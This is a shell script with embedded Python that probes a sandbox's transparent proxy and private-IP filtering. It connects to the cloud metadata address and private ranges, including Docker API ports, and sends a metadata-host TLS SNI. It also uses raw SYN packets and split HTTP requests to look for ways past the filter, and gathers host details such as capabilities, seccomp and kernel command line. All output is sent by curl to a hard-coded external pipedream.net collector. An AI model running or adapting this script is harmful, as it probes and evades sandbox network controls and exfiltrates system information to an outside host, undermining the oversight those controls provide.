#!/bin/sh
# tcp-proxy-bypass-probe.sh
#
# Usage:
#   COLLECTOR_URL="https://your-collector.example/path" sh tcp-proxy-bypass-probe.sh
#
# Purpose:
# - Bounded TCP-focused tests for transparent proxy/private-IP filtering.
# - Compare normal connect, raw TCP SYN, segmented HTTP, CONNECT-ish forms,
#   and TLS handshake-only behavior.
#
# Safety:
# - No broad scans.
# - No metadata token paths.
# - No payload dumping from agent traffic.
# - Only small private/reserved target set.

COLLECTOR_URL="${COLLECTOR_URL:-https://eoqy29v9qqzscf0.m.pipedream.net/}"
POST_TIMEOUT="${POST_TIMEOUT:-30}"
SOCKET_TIMEOUT="${SOCKET_TIMEOUT:-2.0}"

(
set -x

echo "=============================="
echo "=== context =================="
echo "=============================="
date
id
uname -a
hostname -I 2>&1 || true
cat /proc/cmdline 2>&1 || true
cat /proc/net/route 2>&1 || true
cat /proc/net/arp 2>&1 || true
cat /proc/net/dev 2>&1 || true
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp' /proc/self/status 2>&1 || true

echo
echo "=============================="
echo "=== normal TCP connect ======="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket, os

TIMEOUT = float(os.environ.get("SOCKET_TIMEOUT", "2.0"))

targets = ["169.254.169.254", "10.0.0.1", "100.64.0.1", "192.0.2.1"]
ports = [22, 53, 80, 443, 2375, 2376, 8080, 8443]

for host in targets:
    for port in ports:
        print(f"=== CONNECT {host}:{port} ===")
        s = socket.socket()
        s.settimeout(TIMEOUT)
        try:
            s.connect((host, port))
            print("CONNECT_OK")
            if port == 80:
                s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
                try:
                    data = s.recv(512)
                    print("RECV", data.decode("utf-8", "replace"))
                except Exception as e:
                    print("RECV_FAIL", type(e).__name__, e)
        except Exception as e:
            print("CONNECT_FAIL", type(e).__name__, e)
        finally:
            s.close()
PY

echo
echo "=============================="
echo "=== HTTP payload shaping ====="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket, time, os

TIMEOUT = float(os.environ.get("SOCKET_TIMEOUT", "2.0"))

tests = [
    ("no_payload_hold", []),
    ("one_newline", [b"\n"]),
    ("invalid_method", [b"BOGUS / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"]),
    ("split_request", [b"GET ", b"/ HTTP/1.1\r\n", b"Host: example.com\r\n", b"Connection: close\r\n\r\n"]),
    ("bytewise_request", list(b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n")),
    ("websocket_upgrade", [
        b"GET / HTTP/1.1\r\n",
        b"Host: example.com\r\n",
        b"Connection: Upgrade\r\n",
        b"Upgrade: websocket\r\n",
        b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n",
        b"Sec-WebSocket-Version: 13\r\n\r\n",
    ]),
]

for host in ["169.254.169.254", "10.0.0.1", "100.64.0.1"]:
    for name, chunks in tests:
        print(f"=== HTTP_SHAPE dst={host}:80 test={name} ===")
        s = socket.socket()
        s.settimeout(TIMEOUT)
        try:
            s.connect((host, 80))
            print("CONNECT_OK")
            for c in chunks:
                if isinstance(c, int):
                    c = bytes([c])
                s.sendall(c)
                time.sleep(0.03)
            try:
                data = s.recv(1024)
                print("RECV", data.decode("utf-8", "replace"))
            except Exception as e:
                print("RECV_FAIL", type(e).__name__, e)
        except Exception as e:
            print("FAIL", type(e).__name__, e)
        finally:
            try:
                s.close()
            except Exception:
                pass
PY

echo
echo "=============================="
echo "=== TLS handshake-only ======="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket, ssl, os

TIMEOUT = float(os.environ.get("SOCKET_TIMEOUT", "2.0"))

tests = [
    ("169.254.169.254", "example.com"),
    ("169.254.169.254", "metadata.google.internal"),
    ("10.0.0.1", "example.com"),
    ("100.64.0.1", "example.com"),
]

for dst, sni in tests:
    print(f"=== TLS_ONLY dst={dst}:443 sni={sni} ===")
    raw = socket.socket()
    raw.settimeout(TIMEOUT)
    try:
        raw.connect((dst, 443))
        ctx = ssl.create_default_context()
        ss = ctx.wrap_socket(raw, server_hostname=sni)
        print("TLS_OK", ss.version(), ss.cipher())
        cert = ss.getpeercert()
        print("CERT_SUBJECT", cert.get("subject"))
        print("CERT_SAN_HEAD", (cert.get("subjectAltName") or [])[:5])
        ss.settimeout(0.7)
        try:
            data = ss.recv(512)
            print("POST_HANDSHAKE_RECV", data.decode("utf-8", "replace"))
        except Exception as e:
            print("POST_HANDSHAKE_RECV_FAIL", type(e).__name__, e)
        ss.close()
    except Exception as e:
        print("TLS_FAIL", type(e).__name__, e)
        try:
            raw.close()
        except Exception:
            pass
PY

echo
echo "=============================="
echo "=== explicit source bind ====="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket, os

TIMEOUT = float(os.environ.get("SOCKET_TIMEOUT", "2.0"))

def get_primary_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        pass
    # Fallback from hostname -I-like behavior is awkward in pure Python;
    # use known observed guest IP if present.
    return "192.0.2.2"

srcs = ["0.0.0.0", get_primary_ip()]
dsts = ["169.254.169.254", "10.0.0.1", "100.64.0.1"]

for src in srcs:
    for dst in dsts:
        print(f"=== BIND src={src} -> {dst}:80 ===")
        s = socket.socket()
        s.settimeout(TIMEOUT)
        try:
            s.bind((src, 0))
            print("BOUND", s.getsockname())
            s.connect((dst, 80))
            print("CONNECT_OK", s.getsockname())
            s.sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n")
            data = s.recv(512)
            print("RECV", data.decode("utf-8", "replace"))
        except Exception as e:
            print("FAIL", type(e).__name__, e)
        finally:
            s.close()
PY

echo
echo "=============================="
echo "=== raw TCP SYN probe ========"
echo "=============================="
python3 - <<'PY' 2>&1 || true
import os, socket, struct, time, random, select

# This sends a very small number of raw TCP SYN packets without spoofing
# a foreign source. It listens for TCP or ICMP responses.
#
# It is intended to answer:
# - Does raw TCP reach private IPs differently than normal connect()?
# - Do we see SYN-ACK/RST/ICMP from the gateway/proxy/target?

TARGETS = [
    ("169.254.169.254", 80),
    ("169.254.169.254", 443),
    ("10.0.0.1", 80),
    ("10.0.0.1", 443),
    ("100.64.0.1", 80),
    ("100.64.0.1", 443),
    ("192.0.2.1", 80),
]

def checksum(data):
    if len(data) % 2:
        data += b"\0"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff

def get_src_ip_for(dst):
    # UDP connect does not send packets, but asks kernel for route-selected source.
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 9))
        return s.getsockname()[0]
    finally:
        s.close()

def tcp_flags_str(flags):
    out = []
    for bit, name in [(0x01,"FIN"),(0x02,"SYN"),(0x04,"RST"),(0x08,"PSH"),(0x10,"ACK"),(0x20,"URG")]:
        if flags & bit:
            out.append(name)
    return ",".join(out) or "-"

def build_syn(src_ip, dst_ip, sport, dport, seq):
    # IPv4 header
    ver_ihl = 0x45
    tos = 0
    tot_len = 20 + 20
    ident = random.randrange(0, 65535)
    frag = 0
    ttl = 64
    proto = socket.IPPROTO_TCP
    ip_csum = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    iphdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, tot_len, ident, frag, ttl, proto, ip_csum, src, dst)
    ip_csum = checksum(iphdr)
    iphdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, tot_len, ident, frag, ttl, proto, ip_csum, src, dst)

    # TCP header
    data_offset = 5 << 4
    flags = 0x02
    window = 64240
    csum = 0
    urg = 0
    tcph = struct.pack("!HHLLBBHHH", sport, dport, seq, 0, data_offset, flags, window, csum, urg)
    pseudo = src + dst + struct.pack("!BBH", 0, proto, len(tcph))
    csum = checksum(pseudo + tcph)
    tcph = struct.pack("!HHLLBBHHH", sport, dport, seq, 0, data_offset, flags, window, csum, urg)
    return iphdr + tcph

def parse_ipv4(pkt):
    if len(pkt) < 20:
        return None
    ihl = (pkt[0] & 0x0f) * 4
    proto = pkt[9]
    src = socket.inet_ntoa(pkt[12:16])
    dst = socket.inet_ntoa(pkt[16:20])
    return ihl, proto, src, dst

try:
    send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    recv_tcp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    recv_icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    recv_tcp.setblocking(False)
    recv_icmp.setblocking(False)
except Exception as e:
    print("RAW_SOCKET_FAIL", type(e).__name__, e)
    raise SystemExit

probes = []
for dst, dport in TARGETS:
    try:
        src = get_src_ip_for(dst)
    except Exception as e:
        print(f"ROUTE_SRC_FAIL dst={dst} {type(e).__name__}: {e}")
        continue
    sport = random.randrange(30000, 60000)
    seq = random.randrange(0, 2**32 - 1)
    pkt = build_syn(src, dst, sport, dport, seq)
    probes.append((src, dst, sport, dport, seq))
    print(f"=== RAW_SYN_SEND {src}:{sport}->{dst}:{dport} seq={seq} ===")
    try:
        send_sock.sendto(pkt, (dst, 0))
        print("SEND_OK")
    except Exception as e:
        print("SEND_FAIL", type(e).__name__, e)

deadline = time.time() + 3.0
seen = 0

while time.time() < deadline:
    r, _, _ = select.select([recv_tcp, recv_icmp], [], [], 0.25)
    for sock in r:
        try:
            pkt, addr = sock.recvfrom(4096)
        except Exception:
            continue
        parsed = parse_ipv4(pkt)
        if not parsed:
            continue
        ihl, proto, src, dst = parsed
        if proto == socket.IPPROTO_TCP and len(pkt) >= ihl + 20:
            sport, dport, seq, ack, off_flags, win, csum, urg = struct.unpack("!HHIIHHHH", pkt[ihl:ihl+20])
            flags = off_flags & 0x01ff
            # print only if it appears related to our probe
            related = False
            for psrc, pdst, psport, pdport, pseq in probes:
                if src == pdst and dst == psrc and sport == pdport and dport == psport:
                    related = True
            if related:
                print(f"RAW_TCP_RECV {src}:{sport}->{dst}:{dport} flags={tcp_flags_str(flags)} seq={seq} ack={ack}")
                seen += 1
        elif proto == socket.IPPROTO_ICMP and len(pkt) >= ihl + 8:
            typ, code = pkt[ihl], pkt[ihl+1]
            print(f"RAW_ICMP_RECV from={src} to={dst} type={typ} code={code} len={len(pkt)}")
            seen += 1

print("RAW_RELATED_RESPONSES", seen)
send_sock.close()
recv_tcp.close()
recv_icmp.close()
PY

echo
echo "=============================="
echo "=== interpretation hints ====="
echo "=============================="
echo "Most interesting outcomes:"
echo "- raw SYN receives SYN-ACK/RST where normal connect is blocked/timed out"
echo "- non-80/443 private ports connect successfully"
echo "- payload shaping produces anything other than private_dest_ip"
echo "- TLS handshake succeeds but no HTTP denial until application data"
echo ""
echo "Less interesting/common outcomes:"
echo "- all HTTP forms return private_dest_ip"
echo "- raw SYN receives no related responses"
echo "- private non-80/443 ports time out"

) 2>&1 | curl -s -m "$POST_TIMEOUT" -X POST --data-binary @- "$COLLECTOR_URL"
